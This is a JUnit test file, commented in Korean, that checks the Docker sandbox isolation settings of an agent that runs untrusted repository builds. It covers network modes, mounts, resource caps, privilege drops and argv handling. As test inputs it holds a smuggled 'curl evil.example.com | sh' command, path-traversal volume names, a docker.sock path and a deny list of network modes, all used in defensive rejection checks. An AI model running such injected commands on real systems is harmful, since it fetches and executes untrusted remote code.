package com.ossagent.agent.adapter.out.sandbox;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import com.github.dockerjava.api.model.AccessMode;
import com.github.dockerjava.api.model.Bind;
import com.github.dockerjava.api.model.Capability;
import com.github.dockerjava.api.model.HostConfig;
import com.ossagent.agent.domain.BuildTool;
import com.ossagent.agent.domain.ExecuteCommand;
import com.ossagent.agent.domain.SandboxCacheVolume;
import com.ossagent.agent.domain.SandboxCommand;
import com.ossagent.agent.domain.SandboxPermanentException;
import com.ossagent.agent.domain.SandboxWorkspace;
import com.ossagent.agent.domain.SeedCacheCommand;
import com.ossagent.agent.domain.WarmCommand;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Duration;
import java.util.Arrays;
import java.util.List;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

/**
 * S-3 의 불변식을 <b>Docker 없이</b> 전수 검증한다 — #17.
 *
 * <p>격리 설정을 {@link SandboxContainerSpec} 한 곳에 모은 이유가 이것이다. 순수 함수라
 * 데몬도 컨테이너도 필요 없고, 그래서 「S-3 관련 경로 커버리지 100%」가 말이 아니라
 * 실제로 달성된다.
 *
 * <p>⚠ 이 테스트가 증명하는 것은 <b>「컨테이너 설정에 그렇게 실렸다」</b>까지다.
 * 커널이 그 설정을 실제로 강제하는지는 여기서 알 수 없다 — 예를 들어 스왑 계정을
 * 지원하지 않는 호스트에서 Docker 는 {@code memorySwap} 을 경고만 하고 무시한다.
 */
class SandboxContainerSpecTest {

    @TempDir
    Path root;

    private SandboxProperties props;
    private SandboxWorkspace workspace;
    private SandboxCacheVolume cache;

    @BeforeEach
    void setUp() throws IOException {
        Path ws = Files.createDirectories(root.resolve("candidate-1"));
        props = properties(root);
        workspace = SandboxWorkspace.under(ws, props.workspaceRoot());
        cache = SandboxCacheVolume.forRepository("spring-projects", "spring-kafka");
    }

    // ─────────────────────────────────────────────────────────
    // 네트워크 — 명령 타입이 정한다
    // ─────────────────────────────────────────────────────────

    @Test
    void 실행_단계는_네트워크가_none_이다_S3() {
        assertThat(SandboxContainerSpec.networkMode(execute(), props))
                .as("여기서 도는 것은 대상 저장소가 정한 명령, 즉 신뢰할 수 없는 코드다")
                .isEqualTo("none");
    }

    @Test
    void 씨딩_단계도_네트워크가_none_이다_S3() {
        assertThat(SandboxContainerSpec.networkMode(seed(), props)).isEqualTo("none");
    }

    @Test
    void 워밍만_전용_네트워크를_쓰고_기본_bridge_가_아니다_S3() {
        String mode = SandboxContainerSpec.networkMode(warm(), props);

        assertThat(mode)
                .as("기본 bridge 에서는 컨테이너가 호스트 게이트웨이로 나갈 수 있다 — "
                        + "호스트에 퍼블리시된 우리 PostgreSQL·Redis·앱 포트가 노출된다")
                .isEqualTo("oss-agent-warm")
                .isNotEqualTo("bridge");
    }

    @Test
    void 전용_네트워크_이름으로_host_나_container_를_쓸_수_없다_S3() {
        // 🔴 「bridge 가 아님」만 보는 검증은 host 를 통과시킨다. host 는 컨테이너가
        //    호스트 네트워크 네임스페이스를 공유하게 만들어 bridge 보다 훨씬 심각하다
        for (String forbidden : List.of("host", "none", "bridge", "container:abc123")) {
            assertThatThrownBy(() -> properties(root, forbidden))
                    .as("격리가 무너지는 네트워크 이름: %s", forbidden)
                    .isInstanceOf(SandboxPermanentException.class);
        }
    }

    @Test
    void 네트워크_이름이_규칙을_벗어나면_거부한다_S3() {
        // 소켓 경로를 마운트하는 것이 아니라, 그런 값이 네트워크 이름으로 들어왔을 때
        // 거부되는지 확인하는 단언이다. 통과하면 오히려 S-3 위반이 된다.
        // safety-ok: 소켓 경로가 거부되는지 검증하는 단언이다 — 마운트하지 않는다
        assertThatThrownBy(() -> properties(root, "/var/run/docker.sock"))
                .isInstanceOf(SandboxPermanentException.class);
        assertThatThrownBy(() -> properties(root, "NET WORK"))
                .isInstanceOf(SandboxPermanentException.class);
    }

    // ─────────────────────────────────────────────────────────
    // 바인드 — 개수가 아니라 대상을 본다
    // ─────────────────────────────────────────────────────────

    @Test
    void 워밍은_캐시_볼륨을_마운트하지_않는다_S3() {
        List<Bind> binds = SandboxContainerSpec.binds(warm());

        assertThat(binds)
                .as("""
                        워밍은 신뢰할 수 없는 코드를 네트워크가 열린 채로 돌리는 유일한 단계다.
                        볼륨에 쓸 수 있으면 init.d/*.gradle 을 심어 다음 워밍에서 자동 실행시킬 수 있고,
                        볼륨은 후보 수명을 넘겨 지속되므로 그 오염이 남는다.""")
                .hasSize(1);
        assertThat(binds.get(0).getPath()).isEqualTo(workspace.path().toString());
        assertThat(binds.get(0).getAccessMode()).isEqualTo(AccessMode.rw);
    }

    @Test
    void 씨딩은_워크스페이스를_읽기전용으로_잡고_볼륨만_쓴다_S3() {
        List<Bind> binds = SandboxContainerSpec.binds(seed());

        assertThat(bindFor(binds, workspace.path().toString()).getAccessMode())
                .as("볼륨에 쓰는 유일한 단계다. 워크스페이스를 고칠 이유가 없다")
                .isEqualTo(AccessMode.ro);
        assertThat(bindFor(binds, cache.name()).getAccessMode()).isEqualTo(AccessMode.rw);
    }

    @Test
    void 실행_단계의_캐시는_읽기전용이다_S3() {
        List<Bind> binds = SandboxContainerSpec.binds(execute());

        assertThat(bindFor(binds, cache.name()).getAccessMode())
                .as("""
                        캐시 공유는 「상태 재사용」이고 external-deps.md 가 금지한 것이다 —
                        앞 실행의 산출물이 다음 판정을 오염시킨다. 읽기전용이면 그 경로가 닫힌다.""")
                .isEqualTo(AccessMode.ro);
        assertThat(bindFor(binds, workspace.path().toString()).getAccessMode())
                .isEqualTo(AccessMode.rw);
    }

    @Test
    void 바인드는_워크스페이스와_캐시_둘뿐이다_S3() {
        for (SandboxCommand command : List.of(warm(), seed(), execute())) {
            assertThat(SandboxContainerSpec.binds(command))
                    .as("S-3 — 파일시스템은 작업 디렉토리만: %s", command.getClass().getSimpleName())
                    .hasSizeLessThanOrEqualTo(2);
        }
    }

    @Test
    void docker_소켓을_마운트하지_않는다_S3() {
        for (SandboxCommand command : List.of(warm(), seed(), execute())) {
            assertThat(SandboxContainerSpec.binds(command))
                    .as("소켓 마운트는 컨테이너 탈출 경로다 — 샌드박스의 의미가 사라진다")
                    .noneMatch(bind -> bind.getPath().contains("docker.sock"));
        }
    }

    @Test
    void 바인드_대상이_워크스페이스_루트_밖이면_거부한다_S3() {
        // 🔴 개수만 세는 검증은 「그 워크스페이스가 어디를 가리키는가」를 보지 못한다.
        //    ~/ 하나면 신뢰할 수 없는 코드가 .ssh·.docker/config.json 을 RW 로 잡는다
        assertThatThrownBy(() -> SandboxWorkspace.under(root.getParent(), props.workspaceRoot()))
                .isInstanceOf(SandboxPermanentException.class);
        assertThatThrownBy(() -> SandboxWorkspace.under(Path.of("/"), props.workspaceRoot()))
                .isInstanceOf(SandboxPermanentException.class);
    }

    @Test
    void 루트_자체는_워크스페이스가_될_수_없다_S3() {
        assertThatThrownBy(() -> SandboxWorkspace.under(root, props.workspaceRoot()))
                .as("루트를 통째로 내주면 다른 후보의 워크스페이스가 함께 노출된다")
                .isInstanceOf(SandboxPermanentException.class);
    }

    @Test
    void 심볼릭_링크로_루트를_빠져나갈_수_없다_S3() throws IOException {
        Path outside = Files.createDirectories(root.getParent().resolve("outside-" + root.getFileName()));
        Path link = root.resolve("escape");
        try {
            Files.createSymbolicLink(link, outside);
        } catch (UnsupportedOperationException | IOException e) {
            return;   // 심링크를 만들 수 없는 환경이면 검증 대상이 없다
        }

        assertThatThrownBy(() -> SandboxWorkspace.under(link, props.workspaceRoot()))
                .as("toRealPath 로 정규화한 뒤 루트 하위임을 본다")
                .isInstanceOf(SandboxPermanentException.class);
    }

    @Test
    void 캐시_볼륨_이름이_호스트_경로가_되지_않는다_S3() {
        // 🔴 Docker 는 마운트 소스가 경로 형태면 볼륨이 아니라 호스트 경로 바인드로 해석한다.
        //    좌표는 대상 저장소에서 온 값이라 SandboxImages 의 이미지 주입과 같은 계열이다
        SandboxCacheVolume hostile = SandboxCacheVolume.forRepository("../../etc", "/passwd");

        assertThat(hostile.name())
                .doesNotContain("/")
                .doesNotContain("..")
                .startsWith("oss-agent-cache-");
        assertThatThrownBy(() -> new SandboxCacheVolume("/var/run"))
                .isInstanceOf(SandboxPermanentException.class);
        assertThatThrownBy(() -> SandboxCacheVolume.forRepository("/", "/"))
                .as("전부 걸러져 접두사만 남으면 모든 저장소가 같은 볼륨을 공유한다")
                .isInstanceOf(SandboxPermanentException.class);
    }

    // ─────────────────────────────────────────────────────────
    // 자원 상한
    // ─────────────────────────────────────────────────────────

    @Test
    void CPU_메모리_PID_타임아웃_상한이_전부_실린다_S3() {
        HostConfig config = SandboxContainerSpec.hostConfig(execute(), props);

        assertThat(config.getCpuQuota()).isEqualTo(200_000L);
        assertThat(config.getCpuPeriod()).isEqualTo(100_000L);
        assertThat(config.getMemory()).isEqualTo(4L * 1024 * 1024 * 1024);
        assertThat(config.getPidsLimit())
                .as("CPU·메모리만으로는 fork 폭탄을 막지 못한다 — 호스트 PID 공간이 고갈된다")
                .isEqualTo(512L);
    }

    @Test
    void 메모리_상한이_스왑으로_늘어나지_않는다_S3() {
        HostConfig config = SandboxContainerSpec.hostConfig(execute(), props);

        assertThat(config.getMemorySwap())
                .as("""
                        memory 만 주면 Docker 가 memory-swap 을 그 2배로 잡는다 —
                        선언한 상한이 상한이 아니게 된다.
                        ⚠ 이 단언이 증명하는 것은 「설정에 그렇게 실렸다」까지다.
                        커널이 스왑 계정을 지원하지 않으면 Docker 는 경고만 하고 무시한다.""")
                .isEqualTo(config.getMemory());
    }

    @Test
    void 권한을_전부_버리고_승격을_막는다_S3() {
        HostConfig config = SandboxContainerSpec.hostConfig(execute(), props);

        assertThat(config.getPrivileged()).isFalse();
        assertThat(config.getCapDrop()).contains(Capability.ALL);
        assertThat(config.getSecurityOpts()).contains("no-new-privileges");
    }

    @Test
    void 컨테이너를_자동_삭제하지_않는다_S3() {
        HostConfig config = SandboxContainerSpec.hostConfig(execute(), props);

        assertThat(config.getAutoRemove())
                .as("""
                        autoRemove 면 종료와 동시에 지워져 로그를 못 읽는다.
                        「정리 결과 로그」와 정면으로 충돌하고, cleanedUp 을 관측할 주체도 사라진다.
                        삭제는 finally 에서 명시적으로 한다.""")
                .isNotEqualTo(Boolean.TRUE);
    }

    @Test
    void 상한이_하나라도_없으면_거부한다_S3() {
        assertThatThrownBy(() -> new com.ossagent.agent.domain.SandboxLimits(
                0, 100_000, 1024, 512, Duration.ofMinutes(1)))
                .isInstanceOf(SandboxPermanentException.class);
        assertThatThrownBy(() -> new com.ossagent.agent.domain.SandboxLimits(
                100_000, 100_000, 0, 512, Duration.ofMinutes(1)))
                .isInstanceOf(SandboxPermanentException.class);
        assertThatThrownBy(() -> new com.ossagent.agent.domain.SandboxLimits(
                100_000, 100_000, 1024, 0, Duration.ofMinutes(1)))
                .isInstanceOf(SandboxPermanentException.class);
        assertThatThrownBy(() -> new com.ossagent.agent.domain.SandboxLimits(
                100_000, 100_000, 1024, 512, null))
                .as("상한 넷 중 타임아웃만 빠뜨리기 쉽다 — 없으면 무한히 돈다")
                .isInstanceOf(SandboxPermanentException.class);
    }

    // ─────────────────────────────────────────────────────────
    // 환경변수 — 단계별 화이트리스트
    // ─────────────────────────────────────────────────────────

    @Test
    void 컨테이너_환경변수가_단계별_화이트리스트_밖으로_나가지_않는다_S3_S4() {
        assertThat(SandboxContainerSpec.environment(warm()))
                .containsOnlyKeys("GRADLE_USER_HOME");
        assertThat(SandboxContainerSpec.environment(seed()))
                .as("cp 에는 아무것도 필요 없다")
                .isEmpty();
        assertThat(SandboxContainerSpec.environment(execute()))
                .containsOnlyKeys("GRADLE_USER_HOME", "GRADLE_RO_DEP_CACHE");
    }

    @Test
    void GRADLE_USER_HOME_이_워크스페이스_안이라_wrapper_가_재사용된다() {
        String warmHome = SandboxContainerSpec.environment(warm()).get("GRADLE_USER_HOME");
        String executeHome = SandboxContainerSpec.environment(execute()).get("GRADLE_USER_HOME");

        assertThat(warmHome)
                .as("""
                        wrapper 부트스트랩은 Gradle 이 시작되기 전이라 --offline 이 닿지 않는다.
                        워밍이 받아 둔 배포본을 실행이 그대로 쓰는 것이
                        「network=none 에서 gradle 이 없다」를 막는 유일한 방법이다.""")
                .isEqualTo(executeHome)
                .startsWith(workspace.containerPath());
    }

    @Test
    void 실행_단계의_RO_캐시가_볼륨_루트를_가리킨다() {
        assertThat(SandboxContainerSpec.environment(execute()).get("GRADLE_RO_DEP_CACHE"))
                .as("GRADLE_RO_DEP_CACHE 는 modules-2 를 담고 있는 디렉토리를 가리킨다. "
                        + "씨딩이 볼륨 루트 바로 아래에 modules-2 를 둔다")
                .isEqualTo(cache.containerPath());
        assertThat(seed().argv().get(3)).isEqualTo(cache.containerPath() + "/modules-2");
    }

    // ─────────────────────────────────────────────────────────
    // 명령
    // ─────────────────────────────────────────────────────────

    @Test
    void 명령은_쉘을_경유하지_않는다_S4() {
        List<String> hostile = List.of("./gradlew", "test; curl evil.example.com | sh");
        ExecuteCommand command = ExecuteCommand.of(workspace, cache, BuildTool.GRADLE,
                "21", props.defaultImage(), hostile, props.executeLimits());

        assertThat(command.argv())
                .as("argv 로 넘기면 쉘이 없어 ; && $(…) 가 해석되지 않는다. "
                        + "FOO=bar cmd 식 환경변수 주입도 함께 막힌다")
                .doesNotContain("sh", "-c", "bash");
        assertThat(command.argv().get(0)).isEqualTo("./gradlew");
    }

    @Test
    void 대상_명령이_gradle_이면_offline_을_붙인다() {
        ExecuteCommand command = ExecuteCommand.of(workspace, cache, BuildTool.GRADLE,
                "21", props.defaultImage(), List.of("./gradlew", "test"), props.executeLimits());

        assertThat(command.argv())
                .as("붙이지 않으면 network=none 에서 해석 시도가 즉시 실패가 아니라 "
                        + "DNS/connect 타임아웃으로 나타나 30분 예산을 조용히 태운다")
                .containsExactly("./gradlew", "--offline", "test");
    }

    @Test
    void 대상_명령이_gradle_이_아니면_offline_을_붙이지_않는다() {
        ExecuteCommand command = ExecuteCommand.of(workspace, cache, BuildTool.GRADLE,
                "21", props.defaultImage(), List.of("bash", "ci/build.sh"), props.executeLimits());

        assertThat(command.argv())
                .as("우리가 이해하지 못하는 명령은 건드리지 않는다 — 붙이면 뜻이 깨진다")
                .containsExactly("bash", "ci/build.sh");
    }

    @Test
    void 이미_offline_이_있으면_다시_붙이지_않는다() {
        ExecuteCommand command = ExecuteCommand.of(workspace, cache, BuildTool.GRADLE, "21",
                props.defaultImage(), List.of("./gradlew", "--offline", "test"), props.executeLimits());

        assertThat(command.argv()).containsExactly("./gradlew", "--offline", "test");
    }

    @Test
    void 워밍_명령은_대상_저장소가_정하지_않는다_S4() {
        assertThat(warm().argv())
                .as("워밍은 네트워크가 열려 있다 — 대상 명령을 여기서 돌리면 "
                        + "임의 네트워크 행위를 대신 해 주는 셈이다")
                .containsExactly("./gradlew", "--no-daemon", "testClasses");
    }

    @Test
    void Maven_은_지원하지_않는다고_실패한다() {
        assertThatThrownBy(() -> WarmCommand.of(workspace, BuildTool.MAVEN, "21",
                props.defaultImage(), props.warmLimits()))
                .as("읽기전용 의존성 캐시 동등물이 없다. "
                        + "지원하지 않는 것을 「네트워크를 열어 실행」으로 대신하지 않는다")
                .isInstanceOf(SandboxPermanentException.class);
    }

    // ─────────────────────────────────────────────────────────
    // 라벨
    // ─────────────────────────────────────────────────────────

    @Test
    void 누수_컨테이너를_찾을_수_있게_인스턴스까지_표시한다() {
        assertThat(SandboxContainerSpec.labels("instance-a"))
                .as("sandbox=true 만으로는 #26 이 「남의 컨테이너를 지워도 되는가」를 다시 만난다")
                .containsEntry("oss-agent.sandbox", "true")
                .containsEntry("oss-agent.instance", "instance-a");
    }

    // ─────────────────────────────────────────────────────────

    private WarmCommand warm() {
        return WarmCommand.of(workspace, BuildTool.GRADLE, "21",
                props.defaultImage(), props.warmLimits());
    }

    private SeedCacheCommand seed() {
        return SeedCacheCommand.of(workspace, cache, "21", props.defaultImage(), props.warmLimits());
    }

    private ExecuteCommand execute() {
        return ExecuteCommand.of(workspace, cache, BuildTool.GRADLE, "21",
                props.defaultImage(), List.of("./gradlew", "test"), props.executeLimits());
    }

    private static Bind bindFor(List<Bind> binds, String source) {
        return binds.stream()
                .filter(bind -> bind.getPath().equals(source))
                .findFirst()
                .orElseThrow(() -> new AssertionError(
                        "바인드를 찾지 못했다: " + source + " · 실제=" + Arrays.toString(binds.toArray())));
    }

    private static SandboxProperties properties(Path root) {
        return properties(root, null);
    }

    private static SandboxProperties properties(Path root, String warmNetwork) {
        return new SandboxProperties(root, null, warmNetwork,
                null, null, null, null, null, null, null, null, null);
    }
}
